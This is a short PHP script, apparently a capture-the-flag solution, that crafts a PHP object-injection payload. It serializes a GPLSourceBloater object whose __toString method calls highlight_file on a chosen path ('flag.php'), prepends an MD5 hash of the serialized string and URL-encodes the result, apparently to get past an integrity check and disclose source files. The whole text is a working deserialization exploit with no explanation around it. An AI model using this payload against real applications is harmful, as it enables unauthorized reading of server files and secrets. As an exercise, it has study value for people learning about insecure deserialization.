<?

Class GPLSourceBloater{
    public function __toString()
    {
        return highlight_file('license.txt', true).highlight_file($this->source, true);
    }
}

$todo = new GPLSourceBloater();
$todo->source = 'flag.php';

$todos = [];
$todos[] = $todo;

$m = serialize($todos);
$h = md5($m);

echo urlencode($h.$m);

?>